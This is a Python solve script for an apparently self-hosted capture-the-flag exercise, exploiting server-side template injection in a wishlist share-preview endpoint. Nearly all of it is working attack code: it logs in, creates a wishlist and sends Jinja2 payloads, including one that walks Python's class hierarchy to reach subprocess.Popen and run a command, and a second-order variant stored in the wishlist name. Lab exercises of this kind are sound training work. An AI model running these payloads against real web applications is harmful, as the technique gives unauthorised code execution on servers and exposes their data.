#!/usr/bin/env python3
"""
Wishlist SSTI (Server-Side Template Injection) Exploit

The /wishlist/{id}/share-preview endpoint renders a user-supplied Jinja2
template server-side WITHOUT sanitisation.  The template context contains
a `flag` variable readable with {{ flag }}.

Usage:
    python solve.py --email user@example.com --password yourpassword
    python solve.py --email user@example.com --password yourpassword --payload sanity
    python solve.py --email user@example.com --password yourpassword --all
    python solve.py --email user@example.com --password yourpassword --custom "{{ 7*7 }}"
"""

import argparse
import sys

try:
    import requests
except ImportError:
    print("requests not installed.  Run: pip install requests")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Pre-built payloads
# ---------------------------------------------------------------------------

PAYLOADS = {
    # Basic sanity check – should render "49"
    "sanity": "{{ 7 * 7 }}",

    # Read the flag directly from the template context
    "flag": "{{ flag }}",

    # Dump the Jinja2 config object
    "config": "{{ config }}",

    # Explore Python's MRO chain
    "selfref": "{{ ''.__class__.__mro__ }}",

    # List all subclasses of object (useful for finding gadgets)
    "subclasses": "{{ ''.__class__.__mro__[1].__subclasses__() }}",

    # RCE: run `id` via subprocess.Popen
    "rce": (
        "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
        "{% if c.__name__ == 'Popen' %}"
        "{{ c(['id'], stdout=-1).communicate()[0].decode() }}"
        "{% endif %}"
        "{% endfor %}"
    ),
}

# Second-order SSTI: payload stored in the wishlist NAME, triggered by share-preview.
# The name is rendered server-side when share-preview is requested.
SECOND_ORDER_PAYLOADS = {
    "sanity":  "{{ 7 * 7 }}",
    "flag":    "{{ flag }}",
    "rce": (
        "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
        "{% if c.__name__ == 'Popen' %}"
        "{{ c(['id'], stdout=-1).communicate()[0].decode() }}"
        "{% endif %}"
        "{% endfor %}"
    ),
}


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def login(base_url: str, email: str, password: str) -> str:
    """Authenticate and return the JWT access token."""
    resp = requests.post(
        f"{base_url}/auth/login",
        json={"email": email, "password": password},
        timeout=10,
    )
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login response missing access_token")
        sys.exit(1)
    print(f"[+] Logged in as {email}")
    return token


def create_wishlist(base_url: str, token: str, name: str = "CTF Exploit") -> str:
    """Create a throwaway wishlist and return its ID."""
    resp = requests.post(
        f"{base_url}/wishlist",
        json={"name": name},
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    resp.raise_for_status()
    wid = resp.json()["id"]
    print(f"[+] Created wishlist '{name}'  id={wid}")
    return wid


def rename_wishlist(base_url: str, token: str, wishlist_id: str, name: str) -> None:
    """Rename a wishlist (used to store second-order SSTI payload in the name)."""
    resp = requests.patch(
        f"{base_url}/wishlist/{wishlist_id}",
        json={"name": name},
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    resp.raise_for_status()


def share_preview(base_url: str, token: str, wishlist_id: str, template: str) -> str:
    """POST the template to share-preview and return raw HTML response."""
    resp = requests.post(
        f"{base_url}/wishlist/{wishlist_id}/share-preview",
        json={"share_template": template},
        headers={"Authorization": f"Bearer {token}"},
        timeout=15,
    )
    resp.raise_for_status()
    return resp.text


def extract_title(html: str) -> str:
    """Extract the rendered <title> text (where second-order name payload fires)."""
    start = html.find("<title>")
    if start == -1:
        return ""
    start += len("<title>")
    end = html.find("</title>", start)
    return html[start:end].strip()


def extract_card(html: str) -> str:
    """Pull the rendered content out of the .card <div>."""
    marker = '<div class="card">'
    start = html.find(marker)
    if start == -1:
        return html
    start += len(marker)
    end = html.find("</div>", start)
    return html[start:end].strip()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Exploit Wishlist SSTI – share-preview endpoint"
    )
    parser.add_argument(
        "--url", default="http://localhost:8001",
        help="API base URL  (default: http://localhost:8001)",
    )
    parser.add_argument("--email",    required=True, help="Registered user email")
    parser.add_argument("--password", required=True, help="User password")
    parser.add_argument(
        "--payload",
        choices=list(PAYLOADS.keys()),
        default="flag",
        help="Predefined payload to send  (default: flag)",
    )
    parser.add_argument(
        "--custom",
        help="Custom Jinja2 template string — overrides --payload",
    )
    parser.add_argument(
        "--all", dest="run_all", action="store_true",
        help="Run every predefined payload in sequence",
    )
    parser.add_argument(
        "--second-order", dest="second_order", action="store_true",
        help=(
            "Demonstrate second-order SSTI: store payload in wishlist NAME via PATCH, "
            "then fire it through share-preview (result appears in page <title>)"
        ),
    )
    args = parser.parse_args()

    print("=" * 60)
    print("  Wishlist SSTI Exploit – LoopyMart CTF")
    print("=" * 60)
    print()

    token       = login(args.url, args.email, args.password)
    wishlist_id = create_wishlist(args.url, token)
    print()

    # ── Second-order SSTI demo ───────────────────────────────────────────────
    if args.second_order:
        print("[*] Second-order SSTI demo")
        print("    Attack flow: PATCH name → store payload → share-preview → payload fires")
        print()
        for pname, payload in SECOND_ORDER_PAYLOADS.items():
            print(f"[*] Storing payload '{pname}' in wishlist name via PATCH …")
            print(f"    Name payload : {payload}")
            rename_wishlist(args.url, token, wishlist_id, payload)
            # Trigger with a neutral share template; the name fires in <title>
            html  = share_preview(args.url, token, wishlist_id, "<h1>Share Preview</h1>")
            title = extract_title(html)
            card  = extract_card(html)
            print(f"    <title>      : {title}")
            print(f"    Card body    : {card}")
            print()
        print("[+] Done.")
        return

    # ── Direct / first-order SSTI ────────────────────────────────────────────
    if args.run_all:
        to_run = PAYLOADS
    elif args.custom:
        to_run = {"custom": args.custom}
    else:
        to_run = {args.payload: PAYLOADS[args.payload]}

    for name, template in to_run.items():
        print(f"[*] Payload  : {name}")
        print(f"    Template : {template}")
        try:
            html   = share_preview(args.url, token, wishlist_id, template)
            result = extract_card(html)
            print(f"    Result   : {result}")
        except requests.HTTPError as exc:
            print(f"    Error    : {exc} — {exc.response.text[:300]}")
        print()

    print("[+] Done.")


if __name__ == "__main__":
    main()
